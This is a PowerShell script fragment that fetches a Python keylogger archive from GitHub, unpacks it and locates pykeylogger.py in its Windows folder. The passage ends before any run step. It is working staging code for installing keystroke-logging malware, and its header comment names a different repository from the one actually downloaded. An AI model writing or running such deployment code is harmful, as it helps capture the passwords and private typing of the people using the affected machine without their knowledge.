#https://github.com/secureyourself7/python-keylogger.git

# ---------------------------
# Download python-keylogger
# ---------------------------
$pykeyloggerZip = Join-Path $scriptRoot "python-keylogger.zip"
$destPath = Join-Path $scriptRoot "python-keylogger"

Write-Host "`nDownloading python-keylogger..."
try {
    Invoke-WebRequest "https://github.com/AlessandroZ/python-keylogger/archive/refs/heads/master.zip" -OutFile $pykeyloggerZip
    Expand-Archive $pykeyloggerZip -DestinationPath $destPath -Force
    Remove-Item $pykeyloggerZip -Force
    Write-Host "python-keylogger downloaded and extracted to $destPath"
} catch {
    Write-Error "Error downloading or extracting python-keylogger: $_"
    return
}

# ---------------------------
# Locate Windows folder and Python script
# ---------------------------
$windowsFolder = Join-Path $destPath "python-keylogger-master\Windows"
$pyScriptName = "pykeylogger.py"

if (-not (Test-Path $windowsFolder)) {
    Write-Error "Windows folder not found at $windowsFolder. Extraction may have failed."
    return
}

$pyScript = Get-ChildItem -Path $windowsFolder -Filter $pyScriptName -File -ErrorAction SilentlyContinue |
            Select-Object -First 1

if ($null -eq $pyScript) {
    Write-Error "Python script '$pyScriptName' not found in the Windows folder!"
    return
}

Write-Host "Found Python script at $($pyScript.FullName)"


